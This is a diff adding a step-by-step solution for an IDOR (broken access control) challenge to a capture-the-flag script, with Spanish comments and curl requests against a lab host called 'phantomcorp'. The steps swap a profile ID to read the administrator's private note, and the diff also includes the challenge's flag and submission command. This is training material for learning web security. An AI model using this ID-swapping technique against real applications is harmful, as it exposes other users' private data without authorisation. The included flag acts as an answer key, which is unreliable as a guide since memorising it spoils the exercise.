@@ -72,3 +72,18 @@ curl -s -i -G http://phantomcorp/buscar \
 # --- Estado consolidado del progreso ---
 ./ctf status 07
 
+
+# --- RETO 5: IDOR - Control de acceso roto (GET /perfil?id=) ---
+# 1. Solicitar el perfil de referencia (id=3); captura HTTP 200 y perfil jperez.
+curl -sS -i -G http://phantomcorp/perfil --data-urlencode "id=3"
+
+# 2. Modificar el identificador al del administrador (id=1); captura HTTP 200,
+#    rol admin y nota_privada que contiene FLAG{idor_broken_access}.
+curl -sS -i -G http://phantomcorp/perfil --data-urlencode "id=1"
+
+# 3. Validar la flag obtenida en la respuesta con el verificador oficial.
+./ctf submit 07 R5 'FLAG{idor_broken_access}'
+
+# 4. Confirmar progreso actualizado.
+./ctf status 07
+
